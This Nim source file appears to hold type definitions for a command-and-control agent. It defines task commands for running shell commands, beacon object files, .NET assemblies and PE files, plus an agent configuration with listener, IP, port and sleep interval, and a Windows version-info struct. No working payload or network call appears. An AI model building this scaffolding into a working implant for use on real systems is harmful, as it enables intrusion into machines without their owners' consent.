import winim 

type 
    TaskCommand* = enum 
        ExecuteShell = "shell"
        ExecuteBof = "bof"
        ExecuteAssembly = "dotnet"
        ExecutePe = "pe"

    TaskStatus* = enum 
        Created = "created"
        Completed = "completed"
        Pending = "pending"
        Failed = "failed"
        Cancelled = "cancelled"

    TaskResult* = string 

    Task* = ref object 
        id*: string 
        agent*: string
        command*: TaskCommand
        args*: seq[string]
        result*: TaskResult
        status*: TaskStatus 

type 
    ProductType* = enum
        UNKNOWN = 0
        WORKSTATION = 1
        DC = 2
        SERVER = 3


# API Structs
type OSVersionInfoExW* {.importc: "OSVERSIONINFOEXW", header: "<windows.h>".} = object
  dwOSVersionInfoSize*: ULONG
  dwMajorVersion*: ULONG
  dwMinorVersion*: ULONG
  dwBuildNumber*: ULONG
  dwPlatformId*: ULONG
  szCSDVersion*: array[128, WCHAR]
  wServicePackMajor*: USHORT
  wServicePackMinor*: USHORT
  wSuiteMask*: USHORT
  wProductType*: UCHAR
  wReserved*: UCHAR

type 
    AgentConfig* = object 
        listener*: string 
        ip*: string 
        port*: int 
        sleep*: int 